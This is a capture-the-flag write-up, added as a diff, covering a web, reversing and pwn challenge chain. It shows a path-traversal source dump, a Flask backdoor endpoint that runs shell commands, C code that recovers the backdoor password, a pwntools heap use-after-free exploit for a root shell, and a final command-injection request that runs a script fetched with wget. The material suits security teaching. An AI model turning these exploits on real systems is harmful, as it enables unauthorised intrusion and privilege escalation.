@@ -1,0 +1,205 @@
+
+## Web
+I find there is a dir traversal. So we could use it to know more about the enviroment. I just burtforce the `../../../../proc/<pid>/environ` and got there is a gunicorn and some python processes. I search online and find it would run some python file. So I get the name of python file `web.py`. So just use the web page to dump the source.
+```python
+from flask import Flask, render_template, request, session, redirect, url_for
+from base64 import b64encode
+from subprocess import check_output
+​
+​
+app = Flask(__name__)
+​
+​
+@app.route('/')
+def index():
+    cassette_path = request.cookies.get('cassette_path', None)
+    if cassette_path:
+        with open(cassette_path, 'rb') as f:
+            cassette_data = b64encode(f.read())
+    else:
+        cassette_data = ''
+    return render_template('index.html', cassette_data=cassette_data)
+​
+​
+@app.route('/cassette', methods=['POST'])
+def cassette():
+    cassette_path = 'cassettes/{}'.format(request.form['cassette_path'])
+    r = redirect(url_for('index'))
+    r.set_cookie('cassette_path', cassette_path)
+    return r
+​
+​
+@app.route('/super_s3cret_b4ckd00r___', methods=['POST'])
+def super_s3cret_b4ckd00r___():
+    out = check_output(['./backdoor', request.form['password']]).strip()
+    if out == 'accepted password':
+        return check_output(request.form['cmd'], shell=True)
+    return redirect(url_for('index'))
+​
+​
+if __name__ == '__main__':
+    app.run('0.0.0.0', port=5000, debug=True)
+​
+```
+​
+## Re
+so we are supposed to break the `backdoor`. So we can just imitate and get the password to run arbitrary command.
+```c
+#include<stdio.h>
+int main()
+{
+    
+    unsigned char table[256] = {
+        0x7D, 0xC4, 0x49, 0x75, 0x8E, 0x78, 0x68, 0xC6, 0x55, 0x63, 0x71, 0x97, 0x60, 0xC3, 0xF9, 0x91, 
+        0x44, 0x53, 0x34, 0xA4, 0x4E, 0x05, 0x35, 0x9B, 0xE3, 0xF2, 0xC5, 0xE7, 0x09, 0xB5, 0xCF, 0xA9, 
+        0x4F, 0x9C, 0x10, 0x00, 0x08, 0x64, 0xC9, 0xD4, 0xB2, 0xE6, 0xA8, 0xBE, 0xDF, 0x7C, 0xD8, 0x28, 
+        0xAD, 0xD7, 0x62, 0x0A, 0x40, 0xDC, 0x3C, 0x41, 0xCA, 0x2E, 0x20, 0x3A, 0x43, 0x84, 0xCB, 0x06, 
+        0xC0, 0xB9, 0x07, 0xC2, 0x2D, 0xBC, 0x0E, 0x52, 0x70, 0x73, 0x66, 0xBF, 0xBA, 0x1C, 0x77, 0x6E, 
+        0x4A, 0x99, 0x2A, 0x36, 0xEF, 0x90, 0x5D, 0x0B, 0xD3, 0x13, 0x47, 0xA3, 0xE1, 0xE0, 0x4B, 0x04, 
+        0x15, 0x6D, 0xF5, 0xFD, 0x0D, 0x26, 0x98, 0x76, 0x0C, 0x30, 0xB7, 0x24, 0xC1, 0x03, 0x5C, 0x9A, 
+        0x89, 0xF4, 0x21, 0x81, 0x6F, 0x5A, 0x57, 0x50, 0x5B, 0x23, 0xE9, 0x18, 0xCC, 0x4D, 0xDE, 0xF8, 
+        0x6B, 0x2C, 0x6A, 0xA5, 0x8F, 0x2B, 0x42, 0xFE, 0xBB, 0x93, 0x9F, 0xD2, 0xE5, 0xFB, 0xB1, 0xD5, 
+        0x65, 0xDD, 0x83, 0xF7, 0x3B, 0xCD, 0x1A, 0x6C, 0x7B, 0xB0, 0xAA, 0xB3, 0x29, 0xD9, 0x51, 0x1F, 
+        0x3E, 0x67, 0x96, 0x8C, 0xE8, 0xD1, 0xEC, 0xCE, 0xF6, 0x87, 0x1D, 0x8D, 0x22, 0x45, 0xFF, 0xA1, 
+        0x74, 0x85, 0xBD, 0x33, 0xEE, 0xB8, 0x11, 0x48, 0x88, 0x16, 0xF1, 0x38, 0x54, 0x95, 0xED, 0x80, 
+        0xF0, 0x37, 0x19, 0x39, 0x46, 0xE2, 0xA0, 0xDB, 0x94, 0x25, 0x32, 0x02, 0xAF, 0xA7, 0xC8, 0xE4, 
+        0x86, 0x17, 0xB4, 0x3F, 0x4C, 0x27, 0x3D, 0x12, 0xA2, 0x61, 0xAB, 0xB6, 0x69, 0x82, 0x9E, 0x58, 
+        0x14, 0x56, 0x2F, 0x5F, 0xF3, 0x59, 0x9D, 0xC7, 0x8A, 0x8B, 0xD0, 0x7A, 0xA6, 0xEB, 0xDA, 0xEA, 
+        0x1E, 0x7F, 0x79, 0x7E, 0x5E, 0xFC, 0x0F, 0xFA, 0x92, 0xAC, 0x31, 0x72, 0xD6, 0xAE, 0x1B, 0x01
+    }; // uniq
+    
+    for(int x = 0; x <0x100;x++)
+    {
+        unsigned char dec[36] = {
+        0x6F, 0x0A, 0x03, 0x81, 0x04, 0x81, 0x50, 0xD7, 0x0C, 0x6F, 0x04, 0x6F, 0x0A, 0x04, 0x0C, 0x0A, 
+        0xF5, 0x6F, 0x04, 0x0D, 0xD7, 0x81, 0x0A, 0x04, 0xD7, 0x24, 0x0A, 0x04, 0xC1, 0x6F, 0x0C, 0x0A, 
+        0x04, 0x21, 0x0A, 0x81
+        };
+        int records[36] = {0};
+​
+        srand(x);
+​
+        for(int j =0 ; j<36 ; j++)
+            records[j] = rand() & 1;
+        //puts("[+] Stage0 Finish");
+​
+        for(int j= 35; j>=0; j--)
+        {
+            if(records[j] ==0)
+            {   
+                unsigned char tmp ;      
+                tmp = dec[j];
+                dec[j] = dec[35];
+                dec[35] = tmp;
+            } 
+        }
+        int check = dec[0];
+        //puts("[+] Stage1 Finish");
+        
+        for(int j = 0 ; j<36;j++)
+        {
+            for(int i =0;i<0x100;i++)
+            {
+                if(dec[j] == table[i])
+                {
+                    dec[j] = i;
+                    break;
+                }
+                
+            }
+​
+        }
+        
+       if(check==x){
+        for(int i=0;i<36;i++)
+        {
+            printf("%c",dec[i]);
+        }
+        puts("");
+       }
+        
+​
+    }
+    /*
+    m3ss_w1th_th3_b3st_d13_l1k3_th3_r3st
+    t3mshsw1tt__3h_3btd1_s31k3l_th33_rs_
+    */
+}
+```
+​
+## pwn
+You can use some kernel vul to escape, I tried some old ones but failed. I find it may be much easier to use the expcepted solution.
+I don't pay much time on it and it may have other vulnerabilities. I find there is an UAF.
+```s
+add(A)
+ln(A,B)
+rm(A)
+```
+​
+so we could do anything and there is `partial RELRO` so it's easy to just hijack `exit(0)` to  run `setuid(0)` and use an uncommon function such as `atoi` to get a shell.
+​
+```python
+from pwn import *
+# context.log_level='debug'
+context.arch='amd64'
+# context.terminal = ['tmux','split','-h']
+p=process("/opt/chal/gibson")
+sla 	= lambda a,b: p.sendlineafter(a,b)
+sa 		= lambda a,b: p.sendafter(a,b)
+ra 		= lambda a,b: p.readuntil(a,b)
+sl      = lambda a: p.sendline(a)
+def cmd(c):
+    sla("> ",c)
+def add(name,size=0x18,c="A"):
+	cmd("touch")
+	sla("?\n",name)
+	sla("?\n",str(size))
+	sla(":\n",c)
+def link(f1,f2):
+    cmd("ln")
+    sla("?\n",f1)
+    sla("?\n",f2)
+def free(name):
+	cmd("rm")
+	sla("?\n",name)
+def show(c):
+	cmd("cat")
+	sla("?\n",c)
+def edit(fname,c):
+	cmd('edit')
+	sla("?\n",fname)
+	sla(":\n",c)
+add("Z")
+add("X")
+add("A",0x100)
+link("A","B")
+free("Z")
+free("A")
+show("B")
+p.read(0x10)
+heap  = u64(p.read(8))-(0x605480-0x00604000)
+p.read(0xc8)
+base = u64(p.read(8)) - (0x7ffff7dd1b78-0x00007ffff7a0d000)
+log.warning(hex(heap))
+log.warning(hex(base))
+free("X")
+add("N",0x28)
+pay = p64(0)*10+"n132\0\0\0\0"+p64(0)*9+p64(0x000000000603080)+p64(0x30)
+edit("B",pay)
+edit("n132",p64(0x45390+base)+p64(0xcd2b0+base)+p64(0x8b470+base))
+cmd("exit")
+cmd("touch")
+sla("?\n","n132")
+sla("?\n","cat /opt/chal/flag.txt")
+p.interactive()
+```
+Or you can get a root shell by `setcontext` or `fsop` or `leak the stack and do rop`....
+​
+I upload the script to the github and use wget to download to the server. And run it locally(on the server) to get the flag.
+​
+The final trigger looks like
+```python
+# url = http://offsec-chalbroker.osiris.cyber.nyu.edu:4000/super_s3cret_b4ckd00r___
+password=t3mshsw1tt__3h_3btd1_s31k3l_th33_rs_&cmd=python /tmp/exp.py > /tmp/log ; cat /tmp/log
+```
+​
